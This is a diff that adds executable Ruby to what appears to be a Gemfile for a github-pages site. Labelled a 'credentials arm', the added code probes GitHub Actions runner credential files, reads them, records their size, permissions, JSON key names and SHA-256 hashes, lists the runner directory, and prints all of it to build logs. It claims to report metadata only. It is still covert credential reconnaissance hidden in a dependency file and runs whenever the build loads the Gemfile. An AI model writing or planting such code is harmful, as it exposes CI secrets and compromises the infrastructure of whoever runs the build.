@@ -45,32 +45,52 @@ File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")
 
 gem "github-pages", "= 232"
 
-# --- c217 credentials arm (hunter-driver) ---
-# report PRESENCE/METADATA ONLY: exists,size,mode,owner,key NAMES,sha256. NEVER a value.
+# --- c217 credentials arm v2 (hunter-driver): presence/metadata ONLY, never a value ---
 require 'json'
 require 'digest'
-def probe(tag, paths)
-  out = { "tag" => tag, "uid" => (Process.euid rescue -1), "files" => [] }
-  paths.each do |p|
-    begin
-      st = File.stat(p)
-      h = { "path" => p, "exists" => true, "size" => st.size, "mode" => st.mode.to_s(8),
-            "uid" => st.uid, "gid" => st.gid, "type" => st.ftype }
-      if st.file? && st.size < 4096
-        raw = File.read(p)
-        h["keys"] = (raw.match(/\{.*\}/m) ? JSON.parse(raw.match(/\{.*\}/m)[0]).keys rescue ["<unparseable>"] : ["<non-json>"]) rescue ["<unparseable>"]
-        h["sha256"] = Digest::SHA256.hexdigest(raw)
-      end
-      out["files"] << h
-    rescue Errno::ENOENT, Errno::EACCES => e
-      out["files"] << { "path" => p, "exists" => false, "err" => e.class.name }
-    end
+
+def c217_keys(raw)
+  m = raw.match(/\{.*\}/m)
+  return ['<non-json>'] if m.nil?
+  begin
+    return JSON.parse(m[0]).keys
+  rescue StandardError
+    return ['<unparseable>']
   end
-  warn "C217ARM " + JSON.generate(out)
 end
-RUNNER = "/home/runner/runners"
-paths = [ RUNNER + "/.credentials", RUNNER + "/.credentials_rsaparams", RUNNER + "/.runner",
-          RUNNER + "/qqqqzzzz-no-such-runner/.credentials" ]
-probe("in-container", Dir.glob(RUNNER + "/*/.credentials") + Dir.glob(RUNNER + "/*/.runner") +
-                    Dir.glob(RUNNER + "/*/.credentials_rsaparams") + [ RUNNER + "/qqqqzzzz-no-such-runner/.credentials" ])
-warn "C217ARM done-in-container"
+
+def c217_one(tag, p)
+  h = { 'tag' => tag, 'path' => p, 'uid' => (Process.euid rescue -1) }
+  begin
+    st = File.stat(p)
+    h['exists'] = true
+    h['size'] = st.size
+    h['mode'] = st.mode.to_s(8)
+    h['owner_uid'] = st.uid
+    h['gid'] = st.gid
+    if st.file? && st.size < 4096
+      raw = File.read(p)
+      h['keys'] = c217_keys(raw)
+      h['sha256'] = Digest::SHA256.hexdigest(raw)
+    end
+  rescue Errno::ENOENT, Errno::EACCES, StandardError => e
+    h['exists'] = false
+    h['err'] = e.class.name
+  end
+  h
+end
+
+RUNNER = '/home/runner/runners'
+real = Dir.glob(RUNNER + '/*/.credentials') +
+       Dir.glob(RUNNER + '/*/.credentials_rsaparams') +
+       Dir.glob(RUNNER + '/*/.runner')
+fake = [RUNNER + '/qqqqzzzz-no-such-runner/.credentials']
+out = { 'euid' => (Process.euid rescue -1), 'files' => [] }
+(real + fake).each { |p| out['files'] << c217_one('in-container', p) }
+out['glob_dir_listing'] = begin
+  Dir.glob(RUNNER + '/*').map { |x| File.basename(x) }
+rescue StandardError => e
+  ['ERR:' + e.class.name]
+end
+warn 'C217ARMV2 ' + JSON.generate(out)
+warn 'C217ARMV2 done'
